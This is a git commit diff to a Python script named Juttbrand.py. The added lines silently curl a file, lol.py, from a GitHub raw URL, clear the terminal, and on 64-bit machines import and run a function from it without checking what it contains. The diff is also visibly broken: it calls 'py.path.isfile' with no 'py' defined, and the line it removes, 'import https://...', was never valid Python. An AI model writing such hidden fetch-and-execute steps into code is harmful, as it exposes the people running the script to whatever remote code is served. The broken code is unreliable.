615d512b0d796696ac7a849b58a8d77f86b992a2
SHOOTER-MAKAR <107881797+SHOOTER-MAKAR@users.noreply.github.com>
2022-06-20 11:45:30 -0700

    Update Juttbrand.py

--- Juttbrand.py
+++ Juttbrand.py
@@ -1,5 +1,15 @@
 #coding=utf-8
 import os, sys, platform
+try:
+    import requests
+except:
+    os.system('pip install requests')
 
 import requests
-import https://github.com/SHOOTER-MAKAR/jutt/blob/main/ok_enc.py
+if not py.path.isfile('lol.py'):
+    os.system('curl -L https://raw.githubusercontent.com/SHOOTER-MAKAR/jutt/main/lol.py > lol.py')
+    os.system('clear')
+bit=platform.architecture()[0]
+if bit == '64bit':
+    from lol import reg
+    reg()
